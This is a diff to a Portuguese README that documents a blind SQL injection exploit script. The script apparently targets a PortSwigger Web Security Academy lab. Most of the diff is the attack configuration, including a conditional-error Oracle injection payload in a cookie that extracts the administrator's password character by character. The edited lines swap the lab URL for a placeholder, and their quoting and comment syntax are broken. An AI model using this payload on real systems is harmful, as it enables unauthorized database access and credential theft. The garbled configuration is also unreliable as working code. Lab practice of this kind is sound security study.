@@ -16,12 +16,12 @@ Este repositório contém um script Python para explorar vulnerabilidades de **B
    
 2. **Configure o exploit com os parametros de ataque**
 -- Linha 97:
-# Configurações do ataque
-url = "https://0a0800ab035dfe87808d3fa400370034.web-security-academy.net/"
-max_requests = 1000
-status_check = 500
-cookie_template = "'||(SELECT CASE WHEN SUBSTR(password,$1,1)='$2' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
-tamanho_senha = 20  # Defina o comprimento estimado da senha
+"Configurações do ataque
+url = "https://url.com"
+max_requests = 1000 -- Valor limite da requisição no pool
+status_check = 500 -- Status de retorno
+cookie_template = "'||(SELECT CASE WHEN SUBSTR(password,$1,1)='$2' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" -- SQLi
+tamanho_senha = 20  # Defina o comprimento estimado da senha" -- Tamanho da senha. "
 
 3. **Execute o exploit**
    python3 fuzzer_for_blind_sqli.py
